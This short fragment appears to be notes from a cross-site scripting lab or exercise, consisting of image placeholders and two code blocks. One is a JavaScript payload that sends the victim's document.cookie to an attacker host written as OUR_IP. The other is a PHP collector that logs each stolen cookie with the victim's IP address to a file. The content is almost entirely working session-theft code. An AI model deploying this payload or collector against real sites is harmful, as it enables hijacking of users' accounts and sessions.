![alt text](images/17.png)
![alt text](images/18.png)

![alt text](images/19.png)

```
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

![alt text](images/20.png)